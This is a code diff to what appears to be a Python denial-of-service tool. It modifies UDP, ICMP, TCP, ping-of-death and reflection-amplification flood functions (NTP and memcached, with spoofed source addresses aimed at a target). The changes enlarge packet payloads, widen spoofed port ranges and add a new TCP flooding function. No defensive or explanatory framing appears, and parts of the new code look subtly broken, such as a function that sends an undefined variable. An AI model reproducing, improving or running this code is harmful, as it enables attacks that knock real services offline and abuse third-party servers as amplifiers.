@@ -253,12 +253,12 @@ def UrlFixer(original_url):
 
 def udp(event, timer):
     event.wait()
+    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     while time.time() < timer:
         try:
-            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
             try:
                 for _ in range(multiple):
-                    data = random._urandom(int(Intn(64, 1500)))
+                    data = random._urandom(int(Intn(1024, 60000)))
                     s.sendto(data, (str(target), int(port)))
             except:
                 s.close()
@@ -270,7 +270,7 @@ def icmp(event, timer):
     while time.time() < timer:
         try:
             for _ in range(multiple):
-                packet = random._urandom(int(Intn(64, 1500)))
+                packet = random._urandom(int(Intn(1024, 60000)))
                 pig(target, count=10, interval=0.2, payload_size=len(packet), payload=packet)
         except:
             pass
@@ -286,7 +286,7 @@ def ntp(event, timer):
         try:
             packet = (
                     IP(dst=server, src=target)
-                    / UDP(sport=Intn(2000, 65535), dport=int(port))
+                    / UDP(sport=Intn(1, 65535), dport=int(port))
                     / Raw(load=ntp_payload)
             )
             try:
@@ -302,9 +302,9 @@ mem_payload = "\x00\x00\x00\x00\x00\x01\x00\x00stats\r\n"
 
 
 def mem(event, timer):
-    packets = Intn(10, 150)
-    server = Choice(memsv)
     event.wait()
+    packets = Intn(1024, 60000)
+    server = Choice(memsv)
     while time.time() < timer:
         try:
             try:
@@ -322,11 +322,12 @@ def mem(event, timer):
 
 def tcp(event, timer):
     event.wait()
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
     while time.time() < timer:
         try:
-            data = random._urandom(int(Intn(1024, 65535)))
+            data = random._urandom(int(Intn(1024, 60000)))
             address = (str(target), int(port))
-            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
             try:
                 s.connect(address)
                 for _ in range(multiple):
@@ -336,7 +337,20 @@ def tcp(event, timer):
         except:
             s.close()
 
-
+def vse(event, timer):
+    event.wait()
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    while time.time() < timer:
+        try:
+            address = (str(target), int(port))
+            try:
+                s.connect(address)
+                for _ in range(multiple):
+                    s.send(data)
+            except:
+                s.close()
+        except:
+            s.close()
 class DNSQuery:
     def __init__(self, data):
         self.data = data
@@ -413,7 +427,7 @@ def pod(event, timer):
         try:
             rand_addr = spoofer()
             ip_hdr = IP(src=rand_addr, dst=target)
-            packet = ip_hdr / ICMP() / ("m" * 65535)
+            packet = ip_hdr / ICMP() / ("m" * 60000)
             send(packet)
         except:
             pass
